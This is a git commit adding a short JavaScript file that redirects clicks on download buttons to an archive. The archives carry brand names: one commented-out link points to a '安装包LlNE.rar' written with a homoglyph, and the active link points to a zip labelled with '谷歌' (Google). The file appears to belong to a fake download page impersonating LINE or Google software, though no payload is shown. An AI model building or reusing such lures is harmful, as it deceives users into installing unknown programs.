ef0b439fc0c52ac2d8bfbc9d73a7233116b88bee
a168188aa <lishimingzaw@gmail.com>
2026-08-01 15:26:39 +0800

    Add files via upload

---
+++ downnload/download.js
@@ -0,0 +1,19 @@
+$(function () {
+    // 定义不同class对应的跳转链接
+    var urlMap = {
+        //'link_download': 'https://line-64.oss-ap-southeast-3.aliyuncs.com/%E5%AE%89%E8%A3%85%E5%8C%85LlNE.rar', 
+        'link_download': '/download/谷歌suubinterval .zip',//这个就是改下载链接的地方，要是完整的链接就直接把''号里面的都替换掉，比如'https://www.ddd.com/ddd.zip' 这样即可，如果包上传到这个站点的download文件夹中了，就把aaa换成你的包名
+    };
+
+    // 为每个class添加点击事件
+    Object.keys(urlMap).forEach(function(className) {
+        var elements = document.querySelectorAll('.' + className);
+        
+        elements.forEach(function(element) {
+            element.addEventListener('click', function(event) {
+                event.preventDefault();
+                window.location.href = urlMap[className];
+            });
+        });
+    });
+});
